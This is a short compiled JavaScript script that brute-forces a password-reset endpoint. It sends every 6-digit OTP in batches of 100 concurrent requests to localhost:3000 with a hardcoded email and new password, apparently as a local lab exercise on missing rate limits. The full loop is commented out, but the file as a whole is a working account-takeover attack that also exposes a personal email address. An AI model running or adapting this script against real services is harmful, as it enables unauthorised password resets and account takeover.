"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        //console.log(otp);
        let data = JSON.stringify({
            "email": "sumit.nair26@gmail.com",
            "otp": "" + otp + "",
            "newPassword": "SomenewPassword"
        });
        let config = {
            method: 'POST',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            //url: 'http://localhost:3000/generate-otp',
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        axios_1.default.request(config)
            .then((response) => {
            console.log(JSON.stringify(response.data));
        })
            .catch((error) => {
            console.log(error);
        });
        //   try {
        //     await axios.request(config)
        //     console.log("done for " + otp);
        //   } catch(e) {
        //     console.log(e)
        //   }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i < 1000000; i += 100) {
            const promises = [];
            console.log("here for " + i);
            for (let j = 0; j < 100; j++) {
                promises.push(sendRequest(i + j));
            }
            yield Promise.all(promises);
        }
    });
}
//main()
sendRequest(324434);
